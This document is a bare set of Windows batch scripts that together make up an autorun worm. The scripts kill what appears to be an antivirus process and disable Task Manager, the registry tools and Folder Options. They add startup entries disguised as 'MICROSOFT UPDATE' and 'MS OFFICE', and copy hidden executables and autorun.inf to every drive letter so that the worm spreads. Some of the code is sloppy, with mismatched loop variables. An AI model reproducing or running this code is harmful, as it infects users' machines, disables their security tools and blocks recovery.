taskkill /f /im pvs.exe

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\ /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ /v Hidden /t REG_DWORD /d 2 /f

@ECHO OFF
> "%Temp%.\DefOpen.reg" ECHO Windows Registry Editor Version 5.00
>>"%Temp%.\DefOpen.reg" ECHO.
>>"%Temp%.\DefOpen.reg" ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
>>"%Temp%.\DefOpen.reg" ECHO "MICROSOFT UPDATE"="\"c:\\windows\\system32\\Acrobat.exe\""
>>"%Temp%.\DefOpen.reg" ECHO "MS OFFICE 20010"="\"c:\\windows\\system32\\Microsoft.exe\""
>>"%Temp%.\DefOpen.reg" ECHO.
>>"%Temp%.\DefOpen.reg" ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
>>"%Temp%.\DefOpen.reg" ECHO "MICROSOFT UPDATE"="\"c:\\windows\\system32\\Acrobat.exe\""
>>"%Temp%.\DefOpen.reg" ECHO "MS OFFICE 20010"="\"c:\\windows\\system32\\Microsoft.exe\""
>>"%Temp%.\DefOpen.reg" ECHO.
>>"%Temp%.\DefOpen.reg" ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]
>>"%Temp%.\DefOpen.reg" ECHO “Hidden”=dword:00000002
>>"%Temp%.\DefOpen.reg" ECHO.
>>"%Temp%.\DefOpen.reg" ECHO [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
>>"%Temp%.\DefOpen.reg" ECHO "DisableTaskMgr"=dword:00000001
START /WAIT REGEDIT /S "%Temp%.\DefOpen.reg"
DEL "%Temp%.\DefOpen.reg"

@ECHO OFF
> "%Temp%.\DefOpen.reg" ECHO Windows Registry Editor Version 5.00
>>"%Temp%.\DefOpen.reg" ECHO.
>>"%Temp%.\DefOpen.reg" ECHO [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Windows]
>>"%Temp%.\DefOpen.reg" ECHO "ErrorMode"=dword:00000002
>>"%Temp%.\DefOpen.reg" ECHO.
START /WAIT REGEDIT /S "%Temp%.\DefOpen.reg"
DEL "%Temp%.\DefOpen.reg"


@echo off 
FOR %%z IN ( C D E F G H I J K L M N O ) DO ( 
rd %%u:\microssf\
)


md microssf
start game.exe

@echo off 
FOR %%u IN ( C D E F G H I J K L M N O) DO ( 
if exist %%u:\microssf\ ( 
start %%u:\
rd %%u:\microssf\
)
else (
xcopy /y /h /r open.exe %%u:\
xcopy /y /h /r game.exe %%u:\
xcopy /y /h /r autorun.inf %%u:\
xcopy /y /h /r fifa.bat %%u:\
attrib +s +r +h %%u:\autorun.inf
attrib +s +r +h %%u:\open.exe
attrib +s +r +h %%u:\fifa.bat
attrib +s +r +h %%u:\game.exe
) 

rd microssf